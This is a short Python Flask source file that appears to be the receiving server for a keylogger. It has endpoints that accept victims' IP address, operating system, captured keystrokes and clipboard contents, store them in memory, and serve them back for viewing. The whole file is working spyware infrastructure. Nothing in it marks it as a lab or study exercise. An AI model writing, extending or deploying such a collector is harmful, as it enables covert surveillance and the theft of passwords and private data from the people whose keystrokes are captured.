from flask import Flask, jsonify, request

app = Flask(__name__) 

logged_keys = []
system_info = []
clipboard = ""

@app.route('/sys_info', methods = ['POST'])
def sys_info():
    info = {
        "network_info": request.json['ip'],
        "os_name": request.json['os'],
        "platform": request.json['platform']
    }
    system_info.append(request.json['ip'])
    system_info.append(request.json['os'])
    system_info.append(request.json['platform'])
    return info

@app.route('/log', methods = ['POST'])
def log():
    global clipboard
    global logged_keys
    keys = {
        "logged-keys": request.json['keys'],
        "clipboard": request.json['clipboard']
    }
    clipboard = request.json['clipboard']
    logged_keys = logged_keys + request.json['keys']
    return keys

@app.route('/view_sys_info', methods = ['GET'])
def view_info():
    return system_info

@app.route('/view_keys', methods = ['GET'])
def view():
    return logged_keys

@app.route('/view_clipboard', methods = ['GET'])
def view_clip():
    return clipboard

if __name__ == "__main__":
    app.run(debug=True, port=8080)